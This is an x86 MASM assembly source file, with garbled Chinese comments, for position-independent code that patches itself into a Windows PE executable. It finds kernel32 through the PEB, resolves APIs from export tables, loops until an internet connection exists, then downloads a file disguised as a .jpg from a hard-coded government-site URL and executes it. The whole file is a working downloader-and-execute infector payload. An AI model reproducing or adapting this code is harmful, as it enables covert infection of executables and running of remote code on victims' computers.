;-------------------------
; һ�θ��ӵ�����PE�ļ���С����
; ���δ���ʹ����API������ַ��̬��ȡ�Լ��ض�λ����
; �����ܣ�ʵ�ִ���Ŀ¼�ķ���
; ���ߣ�����
; �������ڣ�2010.6.30
;-------------------------

    .386
    .model flat,stdcall
    option casemap:none

include    windows.inc

_ProtoGetTempFileName  typedef proto :dword,:dword,:dword,:dword
_ProtoInternetOpen     typedef proto :dword,:dword,:dword,:dword,:dword
_ProtoInternetSetOption typedef proto :dword,:dword,:dword,:dword
_ProtoInternetOpenUrl  typedef proto :dword,:dword,:dword,:dword,:dword,:dword
_ProtoHttpQueryInfo    typedef proto :dword,:dword,:dword,:dword,:dword
_ProtoCreateFile   typedef proto :dword,:dword,:dword,:dword,:dword,:dword,:dword
_ProtoInternetReadFile  typedef proto :dword,:dword,:dword,:dword
_ProtoWriteFile     typedef proto :dword,:dword,:dword,:dword
_ProtoSetEndOfFile   typedef proto :dword
_ProtoCloseHandle    typedef proto :dword
_ProtoInternetCloseHandle    typedef proto :dword
_ProtoGetStartupInfo  typedef proto :dword
_ProtoCreateProcess  typedef proto :dword,:dword,:dword,:dword,:dword,\
                                   :dword,:dword,:dword,:dword,:dword
_ProtoSleep          typedef proto :dword
_ProtoInternetGetConnectedStateEx  typedef proto :dword,:dword,:dword,:dword
_ProtoGetProcAddress  typedef proto :dword,:dword
_ProtoLoadLibrary     typedef proto :dword



_ApiGetProcAddress    typedef ptr _ProtoGetProcAddress
_ApiLoadLibrary       typedef ptr _ProtoLoadLibrary
_ApiInternetGetConnectedStateEx         typedef ptr _ProtoInternetGetConnectedStateEx
_ApiSleep         typedef ptr _ProtoSleep
_ApiCreateProcess         typedef ptr _ProtoCreateProcess
_ApiGetStartupInfo         typedef ptr _ProtoGetStartupInfo
_ApiSetEndOfFile         typedef ptr _ProtoSetEndOfFile
_ApiWriteFile         typedef ptr _ProtoWriteFile
_ApiInternetReadFile         typedef ptr _ProtoInternetReadFile
_ApiCreateFile         typedef ptr _ProtoCreateFile
_ApiHttpQueryInfo         typedef ptr _ProtoHttpQueryInfo
_ApiInternetOpenUrl         typedef ptr _ProtoInternetOpenUrl
_ApiInternetSetOption         typedef ptr _ProtoInternetSetOption
_ApiInternetOpen         typedef ptr _ProtoInternetOpen
_ApiGetTempFileName         typedef ptr _ProtoGetTempFileName
_ApiCloseHandle         typedef ptr _ProtoCloseHandle
_ApiInternetCloseHandle         typedef ptr _ProtoInternetCloseHandle




;����ӵ�Ŀ���ļ��Ĵ�������￪ʼ����APPEND_CODE_END������

    .code

jmp _NewEntry

; ��������Ϊ������Ҫ������
; �������в���������ʹ�õ�
szGetProcAddr  db  'GetProcAddress',0
szLoadLib      db  'LoadLibraryA',0

;------------------------------------------------------
; ��������������ȫ�ֱ����Ķ���
;------------------------------------------------------

szKernel32     db  'kernel32.dll',0,0
kernel32NDD     dd  8
szCloseHandle  db  'CloseHandle',0
szCreateFile  db  'CreateFileA',0
szCreateProcess db 'CreateProcessA',0
szGetStartupInfo db 'GetStartupInfoA',0
szGetTempFileName db 'GetTempFileNameA',0
szSetEndOfFile   db 'SetEndOfFile',0
szSleep        db 'Sleep',0
szWriteFile    db 'WriteFile',0
               align 4

hKernel32      dd  ?

kernel32IDD:  ;������ַ
_writeFile  _ApiWriteFile ?
_sleep _ApiSleep ?
_setEndOfFile   _ApiSetEndOfFile ?
_getTempFileName _ApiGetTempFileName ?
_getStartupInfo _ApiGetStartupInfo ?
_createProcess _ApiCreateProcess ?
_createFile   _ApiCreateFile ?
_closeHandle  _ApiCloseHandle ?
              dd 0

szUser32Dll    db  'user32.dll',0,0
hUser32        dd  ?

hWinInet       dd  ?
szWinInet      db  'wininet.dll',0
winInet32NDD   dd  7
szHttpQueryInfoA  db 'HttpQueryInfoA',0
szInternetCloseHandle db 'InternetCloseHandle',0
szInternetGetConnectedStateExA   db 'InternetGetConnectedStateExA',0
szInternetOpen db 'InternetOpenA',0
szInternetOpenUrl db 'InternetOpenUrlA',0
szInternetReadFile db 'InternetReadFile',0
szInternetSetOption db 'InternetSetOptionA',0
                    align 4 
winInet32IDD:  ;ע�⣬���������ֵ���ſ��ԣ���
_internetSetOption _ApiInternetSetOption ?
_internetReadFile _ApiInternetReadFile ?
_internetOpenUrl _ApiInternetOpenUrl ?
_internetOpen _ApiInternetOpen ?
_internetGetConnectedStateEx _ApiInternetGetConnectedStateEx ?
_internetCloseHandle _ApiInternetCloseHandle ?
_httpQueryInfo _ApiHttpQueryInfo ?
                  dd 0


lpCN           db 256 dup(0)
lpDWFlag       dd  ?
szTempPath     db '.',0
szAppName      db 'Shell',0
lpszURL        db 'http://www.sddx.gov.cn/pic/image10/cs/xxb/px/101214b-4.jpg',0
hInternet      dd ?
hInternetFile  dd ?
hThreadID      dd ?
szBuffer       db 50 dup(0)
               align 4

;-----------------------------
; ���� Handler
;-----------------------------------------
_SEHHandler proc _lpException,_lpSEH,_lpContext,_lpDispatcher
  pushad
  mov esi,_lpException
  mov edi,_lpContext
  assume esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
  mov eax,_lpSEH
  push [eax+0ch]
  pop [edi].regEbp
  push [eax+8]
  pop [edi].regEip
  push eax
  pop [edi].regEsp
  assume esi:nothing,edi:nothing
  popad
  mov eax,ExceptionContinueExecution
  ret
_SEHHandler endp

;------------------------------------
; ��ȡkernel32.dll�Ļ���ַ
;------------------------------------
_getKernelBase  proc
   local @dwRet

   pushad

   assume fs:nothing
   mov eax,fs:[30h] ;��ȡPEB���ڵ�ַ
   mov eax,[eax+0ch] ;��ȡPEB_LDR_DATA �ṹָ��
   mov esi,[eax+1ch] ;��ȡInInitializationOrderModuleList ����ͷ
   ;��һ��LDR_MODULE�ڵ�InInitializationOrderModuleList��Ա��ָ��
   lodsd             ;��ȡ˫������ǰ�ڵ��̵�ָ��
   mov eax,[eax+8]   ;��ȡkernel32.dll�Ļ���ַ
   mov @dwRet,eax
   popad
   mov eax,@dwRet
   ret
_getKernelBase  endp   

;-------------------------------
; ��ȡָ���ַ�����API�����ĵ��õ�ַ
; ��ڲ�����_hModuleΪ��̬���ӿ�Ļ�ַ
;           _lpApiΪAPI����������ַ
; ���ڲ�����eaxΪ�����������ַ�ռ��е���ʵ��ַ
;-------------------------------
_getApi proc _hModule,_lpApi
   local @ret
   local @dwLen

   pushad
   mov @ret,0
   ;����API�ַ����ĳ��ȣ���������
   mov edi,_lpApi
   mov ecx,-1
   xor al,al
   cld
   repnz scasb
   mov ecx,edi
   sub ecx,_lpApi
   mov @dwLen,ecx

   ;��pe�ļ�ͷ������Ŀ¼��ȡ�������ַ
   mov esi,_hModule
   add esi,[esi+3ch]
   assume esi:ptr IMAGE_NT_HEADERS
   mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
   add esi,_hModule
   assume esi:ptr IMAGE_EXPORT_DIRECTORY

   ;���ҷ������Ƶĵ���������
   mov ebx,[esi].AddressOfNames
   add ebx,_hModule
   xor edx,edx
   .repeat
     push esi
     mov edi,[ebx]
     add edi,_hModule
     mov esi,_lpApi
     mov ecx,@dwLen
     repz cmpsb
     .if ZERO?
       pop esi
       jmp @F
     .endif
     pop esi
     add ebx,4
     inc edx
   .until edx>=[esi].NumberOfNames
   jmp _ret
@@:
   ;ͨ��API����������ȡ��������ٻ�ȡ��ַ����
   sub ebx,[esi].AddressOfNames
   sub ebx,_hModule
   shr ebx,1
   add ebx,[esi].AddressOfNameOrdinals
   add ebx,_hModule
   movzx eax,word ptr [ebx]
   shl eax,2
   add eax,[esi].AddressOfFunctions
   add eax,_hModule
   
   ;�ӵ�ַ��õ����������ĵ�ַ
   mov eax,[eax]
   add eax,_hModule
   mov @ret,eax

_ret:
   assume esi:nothing
   popad
   mov eax,@ret
   ret
_getApi endp

;-------------------
;��ȡ���к����ĵ�ַ
;-------------------
_getAllApi proc _kernel,_getAddr,_loadLib
    local @dwCount
    pushad


    ;---------------------------------------------------
    ;��ȡWinInet.dll����������к�����ַ
    ;---------------------------------------------------

    ;��ȡ��̬���ӿ�WinInet.dll�Ļ���ַ
    mov eax,offset szWinInet
    add eax,ebx
    mov edx,_loadLib
    push eax
    call edx
    mov hWinInet[ebx],eax

    ;��ȡ�������뺯���ĵ�ַ
    mov esi,offset winInet32NDD
    add esi,ebx
  
    mov ecx,dword ptr [esi]  ;ȡ������
    mov @dwCount,ecx
    dec @dwCount
    add esi,4
loc1:
    mov edi,offset szBuffer
    add edi,ebx

loc2:
    mov al,byte ptr [esi]
    .if al!=0
      mov byte ptr [edi],al
      inc edi
      inc esi
      jmp loc2
    .endif
    mov byte ptr [edi],0 ;szBuffer�д���˺�������
        
    ;��ȡ�ú�����ַ
    mov eax,offset szBuffer
    add eax,ebx
   
    mov edx,_getAddr
    mov ecx,hWinInet[ebx]
    push eax
    push ecx
    call edx

    ;��eax������ַ����IAT��
    pushad
    mov edi,offset winInet32IDD
    add edi,ebx

    push eax
    mov eax,@dwCount
    sal eax,2   ;eax*4
    add edi,eax
    pop eax
    mov dword ptr [edi],eax
    popad

    inc esi
    dec @dwCount
    .if @dwCount!=0FFFFFFFFh
      jmp loc1 
    .endif    

    ;---------------------------------------------------
    ;��ȡkernel32.dll����������к�����ַ
    ;---------------------------------------------------
    mov esi,offset kernel32NDD
    add esi,ebx
  
    mov ecx,dword ptr [esi]  ;ȡ������
    mov @dwCount,ecx
    add esi,4
loc3:
    mov edi,offset szBuffer
    add edi,ebx

loc4:
    mov al,byte ptr [esi]
    .if al!=0
      mov byte ptr [edi],al
      inc edi
      inc esi
      jmp loc4
    .endif
    mov byte ptr [edi],0 ;szBuffer�д���˺�������
        
    ;��ȡ�ú�����ַ
    mov eax,offset szBuffer
    add eax,ebx
   
    mov edx,_getAddr
    mov ecx,_kernel
    push eax
    push ecx
    call edx

    ;��eax������ַ����IAT��
    pushad
    mov edi,offset kernel32IDD
    add edi,ebx

    push eax
    mov eax,@dwCount
    dec eax
    sal eax,2   ;eax*4
    add edi,eax
    pop eax
    mov dword ptr [edi],eax
    popad

    inc esi
    dec @dwCount
    .if @dwCount!=0
      jmp loc3 
    .endif    

    popad
    ret
_getAllApi endp

;-----------------------
; �̺߳��������ز�����
; ����_lpURLָ��Ҫ���ص��ļ�
;-----------------------
_downAndRun proc _lpURL  
  local @szFileName[256]:byte
  local @dwBuffer,@dwNumberOfBytesWritten,@dwBytesToWrite
  local @lpBuffer[200h]:byte
  local @hFile
  local @stStartupInfo:STARTUPINFO  
  local @stProcessInformation:PROCESS_INFORMATION  

  lea edx,@szFileName
  push edx
  push 0
  push NULL
  mov edx,offset szTempPath
  add edx,ebx
  push edx

  mov edx,_getTempFileName[ebx]
  call edx

  push 0
  push NULL
  push NULL
  push INTERNET_OPEN_TYPE_PRECONFIG
  mov edx,offset szAppName
  add edx,ebx
  push edx
  mov edx,_internetOpen[ebx]
  call edx
  .if eax!=NULL
    
    mov hInternet[ebx],eax

    ;�������ӳ�ʱֵ�ͽ��ճ�ʱֵ
    push 4
    lea edx,@dwBuffer
    push edx
    push INTERNET_OPTION_CONNECT_TIMEOUT
    mov edx,hInternet[ebx]
    push edx
    mov edx,_internetSetOption[ebx]
    call edx

    push 4
    lea edx,@dwBuffer
    push edx
    push INTERNET_OPTION_CONTROL_RECEIVE_TIMEOUT
    mov edx,hInternet[ebx]
    push edx
    mov edx,_internetSetOption[ebx]
    call edx

    ;�õ�ǰ������URL
    push 0
    push INTERNET_FLAG_EXISTING_CONNECT
    push NULL
    push NULL
    push _lpURL
    mov edx,hInternet[ebx]
    push edx
    mov edx,_internetOpenUrl[ebx]
    call edx

    .if eax!=NULL
      mov hInternetFile[ebx],eax
      mov @dwNumberOfBytesWritten,200h
      ;��HTTP�ļ�ͷ

      push 0
     
      lea edx,@dwNumberOfBytesWritten
      push edx
      lea edx,@lpBuffer
      push edx

      push HTTP_QUERY_STATUS_CODE
      mov edx,hInternetFile[ebx]
      push edx
      mov edx,_httpQueryInfo[ebx]
      call edx

      .if eax!=NULL

         ;����ʱ�ļ�׼��д
         push 0
         push 0
         push OPEN_ALWAYS
         push NULL
         push 0
         push GENERIC_WRITE
         lea edx,@szFileName
         push edx
         mov edx,_createFile[ebx]
         call edx

         .if eax != 0FFFFFFFFh
           mov @hFile,eax
           .while TRUE
             mov @dwBytesToWrite,0
             ;�������ļ�����
             lea edx,@dwBytesToWrite
             push edx
             push 200h
             lea edx,@lpBuffer
             push edx
             mov edx,hInternetFile[ebx]
             push edx
             mov edx,_internetReadFile[ebx]
             call edx
             .break .if (!eax)
             .break .if (@dwBytesToWrite==0)
             ;д���ļ�

             push 0
             lea edx,@dwNumberOfBytesWritten
             push edx
             push @dwBytesToWrite
             lea edx,@lpBuffer
             push edx
             push @hFile
             mov edx,_writeFile[ebx]
             call edx
           .endw
           push @hFile
           mov edx,_setEndOfFile[ebx]
           call edx
           push @hFile
           mov edx,_closeHandle[ebx]
           call edx
         .endif
      .endif
      mov edx,hInternetFile[ebx]
      push edx
      mov edx,_internetCloseHandle[ebx]
      call edx
    .endif
      mov edx,hInternet[ebx]
      push edx
      mov edx,_internetCloseHandle[ebx]
      call edx
  .endif
 
  ;�������ص��ļ�
  lea edx,@stStartupInfo
  push edx
  mov edx,_getStartupInfo[ebx]
  call edx

  lea edx,@stProcessInformation 
  push edx
  lea edx,@stStartupInfo
  push edx
  push NULL
  push NULL
  push NORMAL_PRIORITY_CLASS
  push FALSE
  push NULL
  push NULL
  lea edx,@szFileName
  push edx
  push NULL
  mov edx,_createProcess[ebx]
  call edx
  .if eax==0
    push @stProcessInformation.hThread
    mov edx,_closeHandle[ebx]
    call edx

    push @stProcessInformation.hProcess
    mov edx,_closeHandle[ebx]
    call edx
  .endif  
  ret  
_downAndRun endp       

;------------------------
; �������ܲ���
; ��������������
;      _kernel:kernel32.dll�Ļ���ַ
;      _getAddr:����GetProcAddress��ַ
;      _loadLib:����LoadLibraryA��ַ
;------------------------
_patchFun  proc _kernel,_getAddr,_loadLib

    ;------------------------------------------------------
    ; �������ܴ���ֲ���������
    ;------------------------------------------------------
    pushad
    ;���������Ƿ���ͨ
    .while TRUE
      push 1000
      mov edx,_sleep[ebx] ;˯��1��
      call edx

      push 0
      push 256
      mov edx,offset lpCN
      add edx,ebx
      push edx
      mov edx,offset lpDWFlag
      add edx,ebx
      push edx

      mov edx,_internetGetConnectedStateEx[ebx]
      call edx
      .break .if eax
    .endw
    mov edx,offset lpszURL
    add edx,ebx
    push edx
    mov edx,offset _downAndRun
    add edx,ebx
    call edx

    popad
    ret
_patchFun  endp

_start  proc
    local hKernel32Base:dword  ;���kernel32.dll��ַ

    local _getProcAddress:_ApiGetProcAddress  ;���庯��
    local _loadLibrary:_ApiLoadLibrary

    pushad

    ;��ȡkernel32.dll�Ļ���ַ
    lea edx,_getKernelBase
    add edx,ebx
    call edx
    mov hKernel32Base,eax

    ;�ӻ���ַ��������GetProcAddress��������ַ
    mov eax,offset szGetProcAddr
    add eax,ebx

    mov edi,hKernel32Base
    mov ecx,edi
    lea edx,_getApi
    add edx,ebx

    push eax
    push ecx
    call edx
    mov _getProcAddress,eax

    ;�ӻ���ַ��������LoadLibraryA��������ַ
    mov eax,offset szLoadLib
    add eax,ebx

    mov edi,hKernel32Base
    mov ecx,edi
    lea edx,_getApi
    add edx,ebx

    push eax
    push ecx
    call edx
    mov _loadLibrary,eax

    ;��ȡ���к����ĵ�ַ
    lea edx,_getAllApi
    add edx,ebx

    push _loadLibrary
    push _getProcAddress
    push hKernel32Base
    call edx

    ;���ò�������
    lea edx,_patchFun
    add edx,ebx

    push _loadLibrary
    push _getProcAddress
    push hKernel32Base
    call edx

    popad
    ret
_start  endp

; EXE�ļ��µ���ڵ�ַ

_NewEntry:
    call @F   ; ��ȥ�ض�λ
@@:
    pop ebx
    sub ebx,offset @B

    invoke _start
    jmpToStart   db 0E9h,0F0h,0FFh,0FFh,0FFh
    ret
    end _NewEntry